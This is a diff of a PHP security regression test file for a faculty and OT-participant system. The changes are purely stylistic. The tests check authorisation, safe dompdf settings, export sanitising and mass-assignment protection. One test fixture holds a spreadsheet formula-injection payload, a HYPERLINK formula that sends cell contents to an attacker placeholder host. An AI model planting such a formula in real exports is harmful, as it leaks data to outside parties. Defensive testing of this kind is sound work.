@@ -61,7 +61,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
         $this->assertFalse(
             $this->mayActOn($controller, 99),
             'A participant on nobody else\'s roster must be refused — this is the gap that let '
-            . 'any faculty user comment on, and notify, any OT in the institute.'
+            .'any faculty user comment on, and notify, any OT in the institute.'
         );
     }
 
@@ -88,8 +88,8 @@ class OtParticipantCommentAuthorisationTest extends TestCase
                 'canActOnOtParticipant',
                 $this->bodyOf($method),
                 "{$method}() acts on one named participant but does not assert roster "
-                . 'membership — canUseOtParticipants() is a blanket capability and says '
-                . 'nothing about WHICH participant.'
+                .'membership — canUseOtParticipants() is a blanket capability and says '
+                .'nothing about WHICH participant.'
             );
         }
     }
@@ -105,7 +105,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
                 "'isPhpEnabled' => true",
                 $body,
                 "{$method}() enables PHP execution in dompdf: any raw block reaching the "
-                . 'template becomes server-side code. The shared export views need none.'
+                .'template becomes server-side code. The shared export views need none.'
             );
             $this->assertStringNotContainsString(
                 "'isRemoteEnabled' => true",
@@ -124,7 +124,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
                 'sanitizeExportRows',
                 $this->bodyOf($method),
                 "{$method}() writes rows to a workbook without sanitize_export_cell(): a cell "
-                . 'beginning = + - @ is evaluated as a formula by Excel (CWE-1236).'
+                .'beginning = + - @ is evaluated as a formula by Excel (CWE-1236).'
             );
         }
     }
@@ -152,7 +152,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
         $method = new ReflectionMethod(UserController::class, 'sanitizeExportRows');
         $method->setAccessible(true);
 
-        $out = $method->invoke(new UserController(), [
+        $out = $method->invoke(new UserController, [
             [1, 'Dr A Sharma', '=HYPERLINK("https://attacker.example/?x="&A1,"Open report")', 'Yes', '-'],
             [2, 'N/A', 'Good progress this week.', 'No', '01 Sep 2026'],
         ]);
@@ -171,7 +171,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
 
     public function test_attribution_columns_are_not_mass_assignable(): void
     {
-        $comment = new OtParticipantComment();
+        $comment = new OtParticipantComment;
 
         $this->assertNotEmpty(
             $comment->getFillable(),
@@ -182,7 +182,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
             $this->assertFalse(
                 $comment->isFillable($column),
                 "{$column} decides who a comment is attributed to, or whether it is visible at "
-                . 'all, and must be assigned by the controller rather than accepted from request input.'
+                .'all, and must be assigned by the controller rather than accepted from request input.'
             );
         }
 
@@ -206,7 +206,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
             $branch,
             $notify,
             'The notification must be sent only inside the notify_ot = 1 branch — an OT who '
-            . 'answered "No" must not be messaged.'
+            .'answered "No" must not be messaged.'
         );
         $this->assertSame(
             1,
@@ -253,7 +253,7 @@ class OtParticipantCommentAuthorisationTest extends TestCase
     /** @param  array<int, true>|null  $roster */
     private function controllerWithRoster(?array $roster): UserController
     {
-        $controller = new UserController();
+        $controller = new UserController;
         $reflection = new ReflectionClass($controller);
 
         // Short-circuits otParticipantRosterPks(), which would otherwise query the
